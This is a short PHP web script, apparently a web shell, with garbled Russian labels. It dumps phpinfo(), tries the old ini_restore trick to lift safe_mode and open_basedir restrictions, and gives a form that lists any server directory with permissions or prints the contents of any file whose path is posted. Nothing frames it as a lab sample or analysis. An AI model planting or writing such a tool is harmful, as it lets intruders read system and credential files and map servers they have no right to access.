<?
///ini_restore("safe_mode");
//if(function_exists('ini_get')){echo "<br>enable";}else{echo "<br>disable";}
phpinfo();

//echo ini_get("safe_mode");echo ini_get("open_basedir");include("/etc");ini_restore("safe_mode");ini_restore("open_basedir");echo ini_get("safe_mode");echo ini_get("open_basedir");include("/etc");
?>

<br />
<form method="post" action=""><input name="path" type="text"
	value="<?=@$_POST['path']?>" size="80" /> <input name="submit"
	type="submit" value="Ñìîòğåòü" /></form>
<?php
if (isset($_POST['submit']) && !empty($_POST['path']))
{
	ini_get("safe_mode");
	ini_get("open_basedir");

	echo "<pre>";

	$path = trim($_POST['path']);

	// ÅÑËÈ ÏÎËÜÇÎÂÀÒÅËÜ ÓÊÀÇÀË ÄÈĞÅÊÒÎĞÈŞ
	if (is_dir($path))
	{
		$handle = opendir($path);
		 
		echo $path."\r\n";
		echo "*".str_repeat("-", 71)."*\r\n";
		echo "| ÈÌß ÔÀÉËÀ ".str_repeat(" ", 47)."| ÏĞÈÂÅËÅÃÈÈ |\r\n";
		echo "|".str_repeat("-", 71)."|\r\n";
		 
		while (FALSE !== ($file = readdir($handle)))
		{
			if ($file != "." && $file != "..")
			{
				$num = strlen($file);
				$perms = @fileperms($path."/".$file)?substr(sprintf('%o', fileperms($path."/".$file)), -4):"----";
				echo "| ".$file.str_repeat(" ", 57 - $num)."| $perms       |\r\n";
			}
		}
		echo "*".str_repeat("-", 71)."*\r\n";
	}
	// ÅÑËÈ ÏÎËÜÇÎÂÀÒÅËÜ ÓÊÀÇÀË ÔÀÉË
	elseif (is_file($path))
	{
		$fp = fopen(trim($_POST['path']), "r");
		echo htmlspecialchars(fread($fp, filesize($_POST['path'])));
	}
	// ÅÑËÈ ÍÅÂÎÇÌÎÆÍÎ ÎÏĞÅÄÅËÈÒÜ, ×ÅÌ ßÂËßÅÒÑß ÑÓÙÍÎÑÒÜ
	else
	{
		echo "Äèğåêòîğèè èëè ôàéëà íå ñóùåñòâóåò!";
	}

	echo "</pre>";
	ini_restore("safe_mode");
	ini_restore("open_basedir");
	ini_get("safe_mode");
	ini_get("open_basedir");
}
?>